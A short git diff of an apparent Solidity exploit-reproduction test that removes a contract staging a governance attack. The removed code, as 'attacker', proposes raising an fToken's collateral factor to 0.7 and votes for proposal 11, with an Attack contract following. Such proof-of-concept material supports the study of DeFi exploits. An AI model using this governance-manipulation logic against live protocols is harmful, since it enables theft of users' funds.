@@ -117,36 +117,7 @@ interface IBorrowerOperations {
     ) external;
 }
 
-contract ProposalCreateFactory is Test {
-    /* Method 0xb9470ff4 */
-    // 創建提案, 提案內容為: 設置 fToken 的抵押係數從 0 變更為 700000000000000000 (0.7 ether)
-    function ProposalCreated() public {
-        address[] memory _target = new address[](1);
-        uint[] memory _value = new uint[](1);
-        string[] memory _signature = new string[](1);
-        bytes[] memory _calldata = new bytes[](1);
-
-        _target[0] = Unitroller;
-        _value[0] = 0;
-        _signature[0] = "_setCollateralFactor(address,uint256)";
-        _calldata[0] = abi.encode(fFTS, 700_000_000_000_000_000);
-
-        vm.prank(attacker);
-        IGovernorAlpha(GovernorAlpha).propose(
-            _target,
-            _value,
-            _signature,
-            _calldata,
-            "Add the FTS token as collateral."
-        );
-    }
-
-    /* Method 0x875a0830 */
-    // 投 Proposal 11 贊成票
-    function castVote() public {
-        IGovernorAlpha(GovernorAlpha).castVote(11, true);
-    }
-}
+contract ProposalCreateFactory {}
 
 contract Attack is Test {
     /* Method 0x2b69be8e */
